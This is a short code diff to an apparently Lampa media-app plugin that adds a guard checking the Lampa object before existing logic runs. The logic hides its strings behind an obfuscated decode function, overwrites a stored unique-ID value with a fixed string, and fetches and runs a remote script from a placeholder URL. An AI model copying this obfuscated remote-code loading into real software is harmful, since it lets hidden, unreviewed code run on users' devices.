@@ -52,21 +52,26 @@
 
         console.log("Interval check attempt:", attemptCount);
 
-        if (Lampa.Manifest.origin === decodeFunction(0x8f, 0)) { // Decoded "valid_origin"
-            console.log("Valid origin detected using decode.");
-            var storageCheck = Lampa.Storage.get(decodeFunction(0x96, 0), ''); // Decoded "lampac_unic_id"
+        // Validate Lampa object and its keys
+        if (Lampa && Lampa.Manifest && Lampa.Storage && Lampa.Utils && Lampa.Noty) {
+            if (Lampa.Manifest.origin === decodeFunction(0x8f, 0)) { // Decoded "valid_origin"
+                console.log("Valid origin detected using decode.");
+                var storageCheck = Lampa.Storage.get(decodeFunction(0x96, 0), ''); // Decoded "lampac_unic_id"
 
-            if (storageCheck !== decodeFunction(0x85, 0)) { // Decoded "tyusdt"
-                Lampa.Storage.set(decodeFunction(0x96, 0), decodeFunction(0x85, 0));
+                if (storageCheck !== decodeFunction(0x85, 0)) { // Decoded "tyusdt"
+                    Lampa.Storage.set(decodeFunction(0x96, 0), decodeFunction(0x85, 0));
+                }
+
+                Lampa.Utils.putScriptAsync([decodeFunction(0x97, 0)], function() { // Decoded "http://example.com/script.js"
+                    console.log("Script loaded successfully.");
+                });
+
+                clearInterval(checkInterval); // Stop interval once successful
+            } else {
+                Lampa.Noty.show(decodeFunction(0x7d, 0)); // Decoded "Ошибка доступа"
             }
-
-            Lampa.Utils.putScriptAsync([decodeFunction(0x97, 0)], function() { // Decoded "http://example.com/script.js"
-                console.log("Script loaded successfully.");
-            });
-
-            clearInterval(checkInterval); // Stop interval once successful
         } else {
-            Lampa.Noty.show(decodeFunction(0x7d, 0)); // Decoded "Ошибка доступа"
+            console.error("Lampa object or its keys are missing.");
         }
     }, 1000);
 
